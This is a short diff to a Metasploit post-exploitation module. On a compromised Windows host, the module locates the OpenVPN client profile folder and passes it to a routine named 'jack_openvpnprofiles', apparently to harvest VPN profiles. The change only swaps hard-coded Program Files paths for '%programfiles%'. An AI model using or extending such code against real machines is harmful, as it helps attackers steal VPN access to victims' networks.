@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Post
 		arch = client.sys.config.sysinfo["Architecture"]
 		print_status("Checking if folder exists...")
 		if arch == "x86"
-			dir = "C:\\Program Files\\OpenVPN Technologies\\OpenVPN Client\\etc\\profile\\"
+			dir = "%programfiles%\\OpenVPN Technologies\\OpenVPN Client\\etc\\profile\\"
 			begin
 				session.fs.dir.entries(dir)
 				jack_openvpnprofiles(dir)
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Post
 				return nil
 			end
 		else
-			dir = "C:\\Program Files (x86)\\OpenVPN Technologies\\OpenVPN Client\\etc\\profile\\"
+			dir = "%programfiles%\\OpenVPN Technologies\\OpenVPN Client\\etc\\profile\\"
 			begin
 				session.fs.dir.entries(dir)
 				jack_openvpnprofiles(dir)
